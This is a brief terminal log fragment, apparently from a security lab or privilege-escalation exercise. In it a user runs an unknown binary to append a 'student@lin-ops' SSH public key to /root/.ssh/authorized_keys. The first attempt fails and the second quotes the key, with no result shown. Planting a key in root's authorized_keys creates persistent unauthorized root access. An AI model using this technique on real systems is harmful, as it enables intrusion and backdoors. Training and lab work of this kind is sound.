+2  3  logger  unknown
+comrade@lin1:/var/tmp/testbed$ ./unknown /root/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMnUROjsdsM4dbziBumkNgvwfxwzIBaAiC+QZwDIqVUnijnWM3aCI+9ztECDkCFtQYMrJXvESp/xlJsaWzvXMwNF5/oGaSnASy5M77BQZgB7S3S9DXliyj4VBTgzNY3SQ+WY/LG100FOLi+dCqVeSDEKu6oWl5VjYk5ShjrzTsa5ZkbH7xdkEWlulGgPzYwcNFwTijpNqzOUALUuVrF0xe3UIZZJWyrnfaOsNuj59CxcKjLWPRJ+PjK3JcyJ5BZV6Sc57t6f+sG+iDWkBRCLx8jthSgwoKiJ2fioNzAfII6VALycDEf2irw7qGtdhVSnYdMTQqEObLx/PFxZvmx6HX student@lin-ops
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown /root/.ssh/authorized_keys "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMnUROjsdsM4dbziBumkNgvwfxwzIBaAiC+QZwDIqVUnijnWM3aCI+9ztECDkCFtQYMrJXvESp/xlJsaWzvXMwNF5/oGaSnASy5M77BQZgB7S3S9DXliyj4VBTgzNY3SQ+WY/LG100FOLi+dCqVeSDEKu6oWl5VjYk5ShjrzTsa5ZkbH7xdkEWlulGgPzYwcNFwTijpNqzOUALUuVrF0xe3UIZZJWyrnfaOsNuj59CxcKjLWPRJ+PjK3JcyJ5BZV6Sc57t6f+sG+iDWkBRCLx8jthSgwoKiJ2fioNzAfII6VALycDEf2irw7qGtdhVSnYdMTQqEObLx/PFxZvmx6HX student@lin-ops"
+
+
+
+
+
